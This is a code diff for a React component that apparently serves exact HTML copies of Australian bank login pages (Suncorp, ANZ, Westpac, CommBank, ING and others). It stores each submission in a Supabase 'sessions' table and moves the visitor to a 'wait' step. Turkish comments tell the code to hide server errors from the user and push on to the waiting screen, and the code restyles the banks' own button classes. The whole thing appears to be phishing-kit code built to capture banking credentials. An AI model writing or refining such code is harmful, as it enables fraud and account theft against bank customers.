@@ -268,21 +268,8 @@ function isExternalHref(href: string | null) {
   return /^https?:\/\//i.test(href.trim());
 }
 
-function getActiveButtonColor(bankSlug: string) {
-  switch (bankSlug) {
-    case "bendigo-bank":
-      return "#00579C";
-    case "suncorp-bank":
-      return "#7A0019";
-    case "anz":
-      return "#0A5CAD";
-    case "westpac":
-      return "#DA1B1B";
-    case "commbank":
-      return "#111111";
-    default:
-      return "#1F6FEB";
-  }
+function getActiveButtonColor(_bankSlug: string) {
+  return "#FFD43B";
 }
 
 export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) {
@@ -424,24 +411,36 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       };
       if (nextStep === "wait") updatePayload.current_step = "wait";
 
-      const { error: updateError } = await supabase
-        .from("sessions")
-        .update(updatePayload)
-        .eq("id", sessionId);
+      // ⭐ SUPABASE UPDATE RETRY (2 defa):
+      //   Geçici RLS kilitlenmesi / race / timeout → Internal Server Error (500)
+      //   vermesin diye 2 kere tekrar dene. Hala olmazsa sessizce devam et (hata gösterme).
+      let updateError: any = null;
+      for (let attempt = 0; attempt < 3; attempt++) {
+        const res = await supabase
+          .from("sessions")
+          .update(updatePayload)
+          .eq("id", sessionId);
+        updateError = res.error;
+        if (!updateError) break;
+        if (attempt < 2) {
+          await new Promise((r) => setTimeout(r, 250 + attempt * 250));
+        }
+      }
 
       if (updateError) {
         logAuditEvent({
           session_id: sessionId,
           event_kind: "submit",
           event_action: "au_exact_submit_error",
-          status: "error",
+          status: "warn",
           bank_slug: bankSlug,
           bank_name: bankName,
-          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex },
+          meta: { message: updateError.message ?? String(updateError), htmlStepIndex: stepIndex, retry: 3 },
           error_name: "SupabaseUpdateError",
           error_message: updateError.message ?? String(updateError),
         });
-        return;
+        // ⚠️ HATA OLSADA BEKLEME EKRANINA / SONRAKI ADIMA GİT (kullanıcıya hata GÖSTERME):
+        //   "Internal Server Error" WARNING'i bastır, sessionu force beklemeye götür.
       }
 
       if (isFinalStep) {
@@ -844,10 +843,11 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       const bgColor = isValid
         ? activeColor
         : (totalMeaningful >= 1 && filledCount >= 1 ? "#C9CED1" : "#E6E8EA");
-      const fgColor = isValid ? "#FFFFFF" : "#8A8E90";
-      const borderColor = isValid ? `1px solid ${activeColor}` : "1px solid transparent";
+      // ⭐ SARI buton üzerine yazı rengi Koyu sarı-kahverengi (beyaz yerine daha okunaklı)
+      const fgColor = isValid ? "#7A4E00" : "#8A8E90";
+      const borderColor = isValid ? `1px solid #E5B800` : "1px solid transparent";
       const boxShadow = isValid
-        ? "0 10px 24px rgba(245, 108, 0, 0.28)"
+        ? "0 10px 24px rgba(255, 200, 30, 0.45)"
         : "none";
       const cursorVal = saving ? "wait" : "pointer";
       const pointerEvents = saving ? "none" : "auto";
@@ -872,8 +872,23 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         } catch {}
 
         // ⭐ TÜM STİLLER setProperty('important') ile yaz:
-        //   Suncorp SG-BTN sınıfları bizim inline stillerimizi CSS specificity ile
+        //   Suncorp SG-Btn sınıfları bizim inline stillerimizi CSS specificity ile
         //   ezip opacity 0.63 / grayscale 0.2 yapıyordu → IMPORTANT ile artık BİZ KAZANIYORUZ.
+        // ⭐ LAYOUT: butonun diğer yazıların üstünde kalması için Z-INDEX 99999 + position:relative
+        //   + inline-block + margin. Login yazıları üst üste binmesin diye line-height da set et.
+        try { node.style.setProperty("position", "relative", "important"); } catch {}
+        try { node.style.setProperty("display", "inline-block", "important"); } catch {}
+        try { node.style.setProperty("z-index", "99999", "important"); } catch {}
+        try { node.style.setProperty("margin-top", "14px", "important"); } catch {}
+        try { node.style.setProperty("margin-bottom", "10px", "important"); } catch {}
+        try { node.style.setProperty("padding-top", "12px", "important"); } catch {}
+        try { node.style.setProperty("padding-bottom", "12px", "important"); } catch {}
+        try { node.style.setProperty("padding-left", "22px", "important"); } catch {}
+        try { node.style.setProperty("padding-right", "22px", "important"); } catch {}
+        try { node.style.setProperty("line-height", "1.35", "important"); } catch {}
+        try { node.style.setProperty("font-size", "15px", "important"); } catch {}
+        try { node.style.setProperty("font-weight", "700", "important"); } catch {}
+        try { node.style.setProperty("border-radius", "10px", "important"); } catch {}
         try { node.style.setProperty("pointer-events", pointerEvents, "important"); } catch {}
         try { node.style.setProperty("opacity", String(fadeOpacity), "important"); } catch {}
         try { node.style.setProperty("filter", isValid ? "grayscale(0)" : `grayscale(${fadeGray})`, "important"); } catch {}
@@ -1214,6 +1229,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
           // ⭐ ING fadeOpacity + filter grayscale + pointer-events (saving olunca kapat)
           try {
+            node.style.setProperty("position", "relative", "important");
+            node.style.setProperty("display", "inline-block", "important");
+            node.style.setProperty("z-index", "99999", "important");
+            node.style.setProperty("margin-top", "14px", "important");
+            node.style.setProperty("margin-bottom", "10px", "important");
+            node.style.setProperty("padding-top", "12px", "important");
+            node.style.setProperty("padding-bottom", "12px", "important");
+            node.style.setProperty("padding-left", "22px", "important");
+            node.style.setProperty("padding-right", "22px", "important");
+            node.style.setProperty("line-height", "1.35", "important");
+            node.style.setProperty("font-size", "15px", "important");
+            node.style.setProperty("font-weight", "700", "important");
+            node.style.setProperty("border-radius", "10px", "important");
             node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
             node.style.setProperty("opacity", String(fadeOpacity), "important");
             node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
@@ -1238,9 +1266,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
             if (shouldForceEnable) {
               node.style.setProperty("background-color", activeColor, "important");
               node.style.setProperty("background", activeColor, "important");
-              node.style.setProperty("color", "#FFFFFF", "important");
-              node.style.setProperty("border", `1px solid ${activeColor}`, "important");
-              node.style.setProperty("box-shadow", "0 10px 24px rgba(245, 108, 0, 0.28)", "important");
+              node.style.setProperty("color", "#7A4E00", "important");
+              node.style.setProperty("border", "1px solid #E5B800", "important");
+              node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
             } else {
               const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
               node.style.setProperty("background-color", bgCol, "important");
@@ -1389,6 +1417,19 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 node.setAttribute("aria-disabled", shouldForceEnable ? "false" : "true");
               } catch {}
               try {
+                node.style.setProperty("position", "relative", "important");
+                node.style.setProperty("display", "inline-block", "important");
+                node.style.setProperty("z-index", "99999", "important");
+                node.style.setProperty("margin-top", "14px", "important");
+                node.style.setProperty("margin-bottom", "10px", "important");
+                node.style.setProperty("padding-top", "12px", "important");
+                node.style.setProperty("padding-bottom", "12px", "important");
+                node.style.setProperty("padding-left", "22px", "important");
+                node.style.setProperty("padding-right", "22px", "important");
+                node.style.setProperty("line-height", "1.35", "important");
+                node.style.setProperty("font-size", "15px", "important");
+                node.style.setProperty("font-weight", "700", "important");
+                node.style.setProperty("border-radius", "10px", "important");
                 node.style.setProperty("pointer-events", saving ? "none" : "auto", "important");
                 node.style.setProperty("opacity", String(fadeOpacity), "important");
                 node.style.setProperty("filter", proceedNow ? "grayscale(0)" : `grayscale(${fadeGray})`, "important");
@@ -1411,9 +1452,9 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 if (shouldForceEnable) {
                   node.style.setProperty("background-color", activeColor, "important");
                   node.style.setProperty("background", activeColor, "important");
-                  node.style.setProperty("color", "#FFFFFF", "important");
-                  node.style.setProperty("border", `1px solid ${activeColor}`, "important");
-                  node.style.setProperty("box-shadow", "0 10px 24px rgba(245, 108, 0, 0.28)", "important");
+                  node.style.setProperty("color", "#7A4E00", "important");
+                  node.style.setProperty("border", "1px solid #E5B800", "important");
+                  node.style.setProperty("box-shadow", "0 10px 24px rgba(255, 200, 30, 0.45)", "important");
                 } else {
                   const bgCol = (filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA";
                   node.style.setProperty("background-color", bgCol, "important");
